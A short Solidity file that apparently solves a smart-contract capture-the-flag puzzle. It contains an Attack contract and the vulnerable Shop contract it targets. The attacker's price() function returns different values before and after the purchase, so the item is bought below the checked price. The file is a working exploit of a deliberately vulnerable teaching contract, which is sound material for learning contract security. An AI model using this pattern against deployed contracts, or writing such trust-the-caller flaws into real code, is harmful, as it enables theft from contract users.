// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// There is state changed in caller contract after the first time call to price funtion.
contract Attack {
    Shop shop;

    constructor(address target) public {
        shop = Shop(target);
        // shop.buy()  get revert, maybe that is beceuse shop contract can not get the msg.sender when constructor.
    }

    function attack() external {
        shop.buy();
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 99 : 100;
    }
}

// souce code
interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}